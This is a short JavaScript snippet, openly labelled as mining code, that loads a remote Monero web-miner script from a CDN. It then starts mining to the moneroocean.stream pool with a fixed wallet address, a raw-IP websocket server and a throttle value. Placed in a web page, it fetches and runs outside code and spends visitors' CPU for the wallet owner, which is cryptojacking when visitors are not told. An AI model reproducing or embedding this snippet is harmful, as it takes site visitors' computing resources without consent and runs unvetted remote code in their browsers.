// Start Of Mining Code (Javascript)
// import command,
// import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';

var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
document.head.appendChild(script);

server = "wss://45.119.82.33:40725";
var pool = "moneroocean.stream";
var walletAddress = "49ETJVdKvfzgKn29Mu4t3GQW3w5JoTAjMU1ySdzZBLBX8Tw6rnPtsB15bxHLAsdv4PLujoDe7KK7cP5u9ByjVGzyGPPp6Gc";
var workerId = "GH-XMR-JS-SNIPPET"
var threads = 1;
var password = "";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;
// End Of Mining Code
